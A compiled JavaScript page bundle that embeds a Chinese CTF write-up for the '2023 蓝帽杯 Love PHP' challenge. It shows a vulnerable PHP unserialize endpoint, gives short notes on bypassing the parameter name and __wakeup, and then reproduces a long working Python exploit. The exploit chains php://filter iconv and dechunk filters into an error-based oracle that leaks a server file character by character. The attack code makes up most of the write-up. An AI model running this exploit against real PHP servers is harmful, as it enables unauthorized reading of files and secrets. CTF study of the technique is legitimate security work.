"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[2027],{1199:(r,e,n)=>{n.r(e),n.d(e,{assets:()=>f,contentTitle:()=>c,default:()=>h,frontMatter:()=>s,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP","title":"2023\u84dd\u5e3d\u676fLove PHP","description":"\u6e90\u7801","source":"@site/docs/CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP","permalink":"/docs/CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/2023\u84dd\u5e3d\u676fLove PHP.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"2022\u9e4f\u7a0b\u676f-web","permalink":"/docs/CTF/Misc/2022\u9e4f\u7a0b\u676f-web"},"next":{"title":"2024\u5f3a\u7f51\u590d\u73b0","permalink":"/docs/CTF/Misc/2024\u5f3a\u7f51\u590d\u73b0"}}');var o=n(4848),i=n(8453);const s={},c=void 0,f={},l=[{value:"\u53c2\u8003",id:"\u53c2\u8003",level:3}];function a(r){const e={a:"a",code:"code",h3:"h3",p:"p",pre:"pre",...(0,i.R)(),...r.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(e.p,{children:"\u6e90\u7801"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-php",children:"<?php \r\nclass Saferman{\r\n    public $check = True;\r\n    public function __destruct(){\r\n        if($this->check === True){\r\n            file($_GET['secret']);\r\n        }\r\n    }\r\n    public function __wakeup(){\r\n        $this->check=False;\r\n    }\r\n}\r\nif(isset($_GET['my_secret.flag'])){\r\n    unserialize($_GET['my_secret.flag']);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,o.jsxs)(e.p,{children:["\u601d\u8def\u5f88\u660e\u786e\uff0c\u5148\u7528",(0,o.jsx)(e.code,{children:"["}),"\u7b26\u53f7\u7ed5\u8fc7\u53d8\u91cf\u540d\u9650\u5236"]}),"\n",(0,o.jsxs)(e.p,{children:["\u7136\u540e\u5728\u7ed5\u8fc7",(0,o.jsx)(e.code,{children:"wakeup"}),"\u51fd\u6570\uff0c\u6700\u540e\u5c31\u662f\u7ed5\u8fc7",(0,o.jsx)(e.code,{children:"file"}),"\u51fd\u6570"]}),"\n",(0,o.jsx)(e.p,{children:"\u56e0\u4e3aphp\u7248\u672c\u662f7.4.33\uff0c\u6240\u4ee5\u4e0d\u80fd\u6539\u53d8\u5c5e\u6027\u6570\u6765\u7ed5\u8fc7wakeup\u51fd\u6570"}),"\n",(0,o.jsx)(e.p,{children:"\u4f46\u53ef\u4ee5\u8fdb\u884cC\u7ed5\u8fc7\uff0c\u5c31\u662f\u5c06O\u6539\u6210C"}),"\n",(0,o.jsxs)(e.p,{children:["\u4f46\u8fd9\u6837\u7684\u8bdd\u53ea\u80fd\u6267\u884cconstruct()\u51fd\u6570\u6216\u8005destruct()\u51fd\u6570\uff0c\u65e0\u6cd5\u6dfb\u52a0\u4efb\u4f55\u5185\u5bb9",(0,o.jsx)(e.code,{children:'C:8:"Saferman":0:{}'})]}),"\n",(0,o.jsx)(e.p,{children:"\u7136\u540e\u5c31\u662f\u5229\u7528filterchain\u8fdb\u884c\u653b\u51fb"}),"\n",(0,o.jsx)(e.pre,{children:(0,o.jsx)(e.code,{className:"language-python",children:"import requests\r\nimport sys\r\nfrom base64 import b64decode\r\n \r\n\"\"\"\r\nTHE GRAND IDEA:\r\nWe can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE\r\nfilter will blow up the string length by 4x every time it is used, which will quickly cause\r\n500 error if and only if the string is non empty. So we now have an oracle that tells us if\r\nthe string is empty.\r\nTHE GRAND IDEA 2:\r\nThe dechunk filter is interesting.\r\nhttps://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724\r\nIt looks like it was implemented for something http related, but for our purposes, the interesting\r\nbehavior is that if the string contains no newlines, it will wipe the entire string if and only if\r\nthe string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our\r\nabove oracle! In fact we can verify that since the flag starts with D that the filter chain\r\ndechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE\r\ndoes not cause a 500 error.\r\nTHE REST:\r\nSo now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent\r\ninto madness trying to figure out ways to:\r\n- somehow get other characters not at the start of the flag file to the front\r\n- detect more precisely which character is at the front\r\n\"\"\"\r\n \r\ndef join(*x):\r\n   return '|'.join(x)\r\n \r\ndef err(s):\r\n   print(s)\r\n   raise ValueError\r\n \r\ndef req(s):\r\n   data = f'php://filter/{s}/resource=/flag'\r\n   return requests.get('http:///?my[secret.flag=C:8:\"Saferman\":0:{}&secret='+data).status_code == 500\r\n \r\n\"\"\"\r\nStep 1:\r\nThe second step of our exploit only works under two conditions:\r\n- String only contains a-zA-Z0-9\r\n- String ends with two equals signs\r\nbase64-encoding the flag file twice takes care of the first condition.\r\nWe don't know the length of the flag file, so we can't be sure that it will end with two equals\r\nsigns.\r\nRepeated application of the convert.quoted-printable-encode will only consume additional\r\nmemory if the base64 ends with equals signs, so that's what we are going to use as an oracle here.\r\nIf the double-base64 does not end with two equals signs, we will add junk data to the start of the\r\nflag with convert.iconv..CSISO2022KR until it does.\r\n\"\"\"\r\n \r\nblow_up_enc = join(*['convert.quoted-printable-encode']*1000)\r\nblow_up_utf32 = 'convert.iconv.L1.UCS-4LE'\r\nblow_up_inf = join(*[blow_up_utf32]*50)\r\n \r\nheader = 'convert.base64-encode|convert.base64-encode'\r\n \r\n# Start get baseline blowup\r\nprint('Calculating blowup')\r\nbaseline_blowup = 0\r\nfor n in range(100):\r\n   payload = join(*[blow_up_utf32]*n)\r\n   if req(f'{header}|{payload}'):\r\n      baseline_blowup = n\r\n      break\r\nelse:\r\n   err('something wrong')\r\n \r\nprint(f'baseline blowup is {baseline_blowup}')\r\n \r\ntrailer = join(*[blow_up_utf32]*(baseline_blowup-1))\r\n \r\nassert req(f'{header}|{trailer}') == False\r\n \r\nprint('detecting equals')\r\nj = [\r\n   req(f'convert.base64-encode|convert.base64-encode|{blow_up_enc}|{trailer}'),\r\n   req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode{blow_up_enc}|{trailer}'),\r\n   req(f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|{blow_up_enc}|{trailer}')\r\n]\r\nprint(j)\r\nif sum(j) != 2:\r\n   err('something wrong')\r\nif j[0] == False:\r\n   header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode'\r\nelif j[1] == False:\r\n   header = f'convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode'\r\nelif j[2] == False:\r\n   header = f'convert.base64-encode|convert.base64-encode'\r\nelse:\r\n   err('something wrong')\r\nprint(f'j: {j}')\r\nprint(f'header: {header}')\r\n \r\n\"\"\"\r\nStep two:\r\nNow we have something of the form\r\n[a-zA-Z0-9 things]==\r\nHere the pain begins. For a long time I was trying to find something that would allow me to strip\r\nsuccessive characters from the start of the string to access every character. Maybe something like\r\nthat exists but I couldn't find it. However, if you play around with filter combinations you notice\r\nthere are filters that *swap* characters:\r\nconvert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:\r\nabcdefgh -> badcfehg\r\nconvert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:\r\nabcdefgh -> dcbahgfe\r\nThis allows us to access the first four characters of the string. Can we do better? It turns out\r\nYES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends <0xff><0xfe> to the start of\r\nthe string:\r\nabcdefgh -> <0xff><0xfe>abcdefgh\r\nThe idea being that if we now use the r4 gadget, we get something like:\r\nba<0xfe><0xff>fedc\r\nAnd then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid\r\n<0xfe><0xff> to get:\r\nbafedc\r\nAnd then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th\r\ncharacters of the string. There's only one problem: our r4 gadget requires that the string length\r\nis a multiple of 4. The original base64 string will be a multiple of four by definition, so when\r\nwe apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no\r\ngood for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it\r\nturns out, if we apply the filter\r\nconvert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7\r\nIt will turn the == into:\r\n+---AD0-3D3D+---AD0-3D3D\r\nAnd this is magic, because this corrects such that when we apply the\r\nconvert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!\r\nLet's recap. We have a string like:\r\nabcdefghij==\r\nApply the convert.quoted-printable-encode + convert.iconv.L1.utf7:\r\nabcdefghij+---AD0-3D3D+---AD0-3D3D\r\nApply convert.iconv.CSUNICODE.CSUNICODE:\r\n<0xff><0xfe>abcdefghij+---AD0-3D3D+---AD0-3D3D\r\nApply r4 gadget:\r\nba<0xfe><0xff>fedcjihg---+-0DAD3D3---+-0DAD3D3\r\nApply base64-decode | base64-encode, so the '-' and high bytes will disappear:\r\nbafedcjihg+0DAD3D3+0DAD3Dw==\r\nThen apply r4 once more:\r\nefabijcd0+gh3DAD0+3D3DAD==wD\r\nAnd here's the cute part: not only have we now accessed the 5th and 6th chars of the string, but\r\nthe string still has two equals signs in it, so we can reapply the technique as many times as we\r\nwant, to access all the characters in the string ;)\r\n\"\"\"\r\n \r\nflip = \"convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode\"\r\nr2 = \"convert.iconv.CSUNICODE.UCS-2BE\"\r\nr4 = \"convert.iconv.UCS-4LE.10646-1:1993\"\r\n \r\ndef get_nth(n):\r\n   global flip, r2, r4\r\n   o = []\r\n   chunk = n // 2\r\n   if chunk % 2 == 1: o.append(r4)\r\n   o.extend([flip, r4] * (chunk // 2))\r\n   if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)\r\n   return join(*o)\r\n \r\n\"\"\"\r\nStep 3:\r\nThis is the longest but actually easiest part. We can use dechunk oracle to figure out if the first\r\nchar is 0-9A-Fa-f. So it's just a matter of finding filters which translate to or from those\r\nchars. rot13 and string lower are helpful. There are probably a million ways to do this bit but\r\nI just bruteforced every combination of iconv filters to find these.\r\nNumbers are a bit trickier because iconv doesn't tend to touch them.\r\nIn the CTF you coud porbably just guess from there once you have the letters. But if you actually \r\nwant a full leak you can base64 encode a third time and use the first two letters of the resulting\r\nstring to figure out which number it is.\r\n\"\"\"\r\n \r\nrot1 = 'convert.iconv.437.CP930'\r\nbe = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'\r\no = ''\r\n \r\ndef find_letter(prefix):\r\n   if not req(f'{prefix}|dechunk|{blow_up_inf}'):\r\n      # a-f A-F 0-9\r\n      if not req(f'{prefix}|{rot1}|dechunk|{blow_up_inf}'):\r\n         # a-e\r\n         for n in range(5):\r\n            if req(f'{prefix}|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):\r\n               return 'edcba'[n]\r\n               break\r\n         else:\r\n            err('something wrong')\r\n      elif not req(f'{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}'):\r\n         # A-E\r\n         for n in range(5):\r\n            if req(f'{prefix}|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):\r\n               return 'EDCBA'[n]\r\n               break\r\n         else:\r\n            err('something wrong')\r\n      elif not req(f'{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}'):\r\n         return '*'\r\n      elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n         # f\r\n         return 'f'\r\n      elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n         # F\r\n         return 'F'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|string.rot13|dechunk|{blow_up_inf}'):\r\n      # n-s N-S\r\n      if not req(f'{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}'):\r\n         # n-r\r\n         for n in range(5):\r\n            if req(f'{prefix}|string.rot13|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):\r\n               return 'rqpon'[n]\r\n               break\r\n         else:\r\n            err('something wrong')\r\n      elif not req(f'{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}'):\r\n         # N-R\r\n         for n in range(5):\r\n            if req(f'{prefix}|string.rot13|string.tolower|' + f'{rot1}|{be}|'*(n+1) + f'{rot1}|dechunk|{blow_up_inf}'):\r\n               return 'RQPON'[n]\r\n               break\r\n         else:\r\n            err('something wrong')\r\n      elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n         # s\r\n         return 's'\r\n      elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n         # S\r\n         return 'S'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}'):\r\n      # i j k\r\n      if req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'k'\r\n      elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'j'\r\n      elif req(f'{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'i'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}'):\r\n      # I J K\r\n      if req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'K'\r\n      elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'J'\r\n      elif req(f'{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'I'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):\r\n      # v w x\r\n      if req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'x'\r\n      elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'w'\r\n      elif req(f'{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'v'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}'):\r\n      # V W X\r\n      if req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'X'\r\n      elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'W'\r\n      elif req(f'{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}'):\r\n         return 'V'\r\n      else:\r\n         err('something wrong')\r\n   elif not req(f'{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):\r\n      # Z\r\n      return 'Z'\r\n   elif not req(f'{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):\r\n      # z\r\n      return 'z'\r\n   elif not req(f'{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):\r\n      # M\r\n      return 'M'\r\n   elif not req(f'{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}'):\r\n      # m\r\n      return 'm'\r\n   elif not req(f'{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):\r\n      # y\r\n      return 'y'\r\n   elif not req(f'{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):\r\n      # Y\r\n      return 'Y'\r\n   elif not req(f'{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):\r\n      # l\r\n      return 'l'\r\n   elif not req(f'{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}'):\r\n      # L\r\n      return 'L'\r\n   elif not req(f'{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):\r\n      # h\r\n      return 'h'\r\n   elif not req(f'{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):\r\n      # H\r\n      return 'H'\r\n   elif not req(f'{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):\r\n      # u\r\n      return 'u'\r\n   elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}'):\r\n      # U\r\n      return 'U'\r\n   elif not req(f'{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n      # g\r\n      return 'g'\r\n   elif not req(f'{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n      # G\r\n      return 'G'\r\n   elif not req(f'{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n      # t\r\n      return 't'\r\n   elif not req(f'{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}'):\r\n      # T\r\n      return 'T'\r\n   else:\r\n      err('something wrong')\r\n \r\nprint()\r\nfor i in range(100):\r\n   prefix = f'{header}|{get_nth(i)}'\r\n   letter = find_letter(prefix)\r\n   # it's a number! check base64\r\n   if letter == '*':\r\n      prefix = f'{header}|{get_nth(i)}|convert.base64-encode'\r\n      s = find_letter(prefix)\r\n      if s == 'M':\r\n         # 0 - 3\r\n         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'\r\n         ss = find_letter(prefix)\r\n         if ss in 'CDEFGH':\r\n            letter = '0'\r\n         elif ss in 'STUVWX':\r\n            letter = '1'\r\n         elif ss in 'ijklmn':\r\n            letter = '2'\r\n         elif ss in 'yz*':\r\n            letter = '3'\r\n         else:\r\n            err(f'bad num ({ss})')\r\n      elif s == 'N':\r\n         # 4 - 7\r\n         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'\r\n         ss = find_letter(prefix)\r\n         if ss in 'CDEFGH':\r\n            letter = '4'\r\n         elif ss in 'STUVWX':\r\n            letter = '5'\r\n         elif ss in 'ijklmn':\r\n            letter = '6'\r\n         elif ss in 'yz*':\r\n            letter = '7'\r\n         else:\r\n            err(f'bad num ({ss})')\r\n      elif s == 'O':\r\n         # 8 - 9\r\n         prefix = f'{header}|{get_nth(i)}|convert.base64-encode|{r2}'\r\n         ss = find_letter(prefix)\r\n         if ss in 'CDEFGH':\r\n            letter = '8'\r\n         elif ss in 'STUVWX':\r\n            letter = '9'\r\n         else:\r\n            err(f'bad num ({ss})')\r\n      else:\r\n         err('wtf')\r\n \r\n   print(end=letter)\r\n   o += letter\r\n   sys.stdout.flush()\r\n \r\n\"\"\"\r\nWe are done!! :)\r\n\"\"\"\r\n \r\nprint()\r\nd = b64decode(o.encode() + b'=' * 4)\r\n# remove KR padding\r\nd = d.replace(b'$)C',b'')\r\nprint(b64decode(d))\n"})}),"\n",(0,o.jsx)(e.p,{children:"\u8dd1\u4e00\u4e0b\u5c31\u884c\u4e86"}),"\n",(0,o.jsx)(e.h3,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,o.jsx)(e.p,{children:(0,o.jsx)(e.a,{href:"https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/#DownUnderCTF2022-minimal-php",children:"Web\u306e\u4fa7\u4fe1\u9053\u521d\u6b65\u8ba4\u8bc6"})}),"\n",(0,o.jsx)(e.p,{children:(0,o.jsx)(e.a,{href:"https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/",children:"php\u4e2dwakeup\u51fd\u6570\u7ed5\u8fc7"})})]})}function h(r={}){const{wrapper:e}={...(0,i.R)(),...r.components};return e?(0,o.jsx)(e,{...r,children:(0,o.jsx)(a,{...r})}):a(r)}},8453:(r,e,n)=>{n.d(e,{R:()=>s,x:()=>c});var t=n(6540);const o={},i=t.createContext(o);function s(r){const e=t.useContext(i);return t.useMemo((function(){return"function"==typeof r?r(e):{...e,...r}}),[e,r])}function c(r){let e;return e=r.disableParentContext?"function"==typeof r.components?r.components(o):r.components||o:s(r.components),t.createElement(i.Provider,{value:e},r.children)}}}]);